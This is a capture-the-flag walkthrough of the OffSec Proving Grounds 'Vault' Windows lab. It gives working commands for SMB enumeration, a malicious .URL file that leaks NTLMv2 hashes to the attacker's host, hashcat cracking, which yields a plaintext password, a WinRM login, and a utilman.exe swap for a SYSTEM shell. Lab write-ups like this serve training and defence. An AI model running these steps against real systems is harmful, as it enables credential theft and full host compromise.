# Vault — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Intermediate
**OS:** Windows (Active Directory)

---

## TL;DR

Writable SMB share (`DocumentsShare`) → Upload malicious `.URL` file pointing to Kali → Capture NTLMv2 hash via Responder → Crack in Hashcat for user `anirudh` → WinRM shell → Abuse `SeRestorePrivilege` to replace `utilman.exe` with `cmd.exe` → RDP lock screen triggers SYSTEM shell.

---

## Enumeration

```bash
nmap -sC -p- -n -Pn -sV --min-rate=9362 192.168.178.172
```

**Open Ports:**
- **53, 88, 135, 139, 445**: Typical AD services
- **389, 636, 3268, 3269**: LDAP
- **3389**: RDP
- **5985**: WinRM

Domain: `vault.offsec`

Inspecting SMB shares:
```bash
smbclient -N -L \\192.168.178.172\
```
We find a non-standard share named **`DocumentsShare`**.

---

## Initial Foothold — NTLM Theft via Writable SMB

Connecting to `DocumentsShare` reveals it's completely empty. Even better, trying to upload test files reveals we have **write access**.

We can abuse this writable share by placing a malicious `.URL` (Windows Shortcut) file in it. When a Windows user or background indexer sweeps the directory, Windows will attempt to resolve the icon path, triggering an automatic SMB authentication request.

1. **Create the malicious `.URL` file (`offsec.url`):**
```ini
[InternetShortcut]
URL=whatever
WorkingDirectory=any
IconFile=\\192.168.45.226\%username%.icon
IconIndex=1
```

2. **Start Responder on Kali:**
```bash
sudo responder -A -I tun0
```

3. **Upload the file via smbclient to `DocumentsShare`.**

Shortly after, Responder catches an incoming NTLMv2 hash for the user `anirudh`:
`anirudh::VAULT:c392c725347f73fb...`

We crack the hash:
```bash
hashcat -m 5600 ani.hash /usr/share/wordlists/rockyou.txt
# Password: SecureHM
```

We log in via WinRM:
```bash
evil-winrm -i 192.168.178.172 -u anirudh -p SecureHM
```

---

## Privilege Escalation — SeRestorePrivilege & Utilman

Checking our privileges:
```cmd
whoami /priv
```
We actively hold **`SeRestorePrivilege`**.

This privilege allows a user to bypass write protections on files owned by SYSTEM. We can abuse this to backdoor the Windows lock screen.
*(Note: Use a script like [EnableSeRestorePrivilege.ps1](https://github.com/gtworek/Priv2Admin/blob/master/Misc/EnableSeRestorePrivilege.ps1) to activate it in the PowerShell session if it's disabled.)*

We navigate to `C:\Windows\System32\` and execute the classic Utilman swap:
```cmd
move utilman.exe utilman.exe.old
move cmd.exe utilman.exe
```

Now, we connect via RDP:
```bash
rdesktop 192.168.178.172
```

At the login screen, clicking the "Ease of Access" (Accessibility) button triggers `utilman.exe`, which we've swapped for the command prompt. 
A `cmd.exe` window pops up as **NT AUTHORITY\SYSTEM**. 🎉

---

## Key Takeaways

- **Writable Anonymous SMB Shares:** Extremely dangerous due to NTLM collection vectors using `.URL`, `.LNK`, or `.SCF` files. Windows explores these natively to retrieve iconography.
- **SeRestorePrivilege:** A direct vector to SYSTEM by modifying core OS files. The `Utilman` (Accessibility) trick remains one of the simplest escalation paths if RDP is enabled.

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
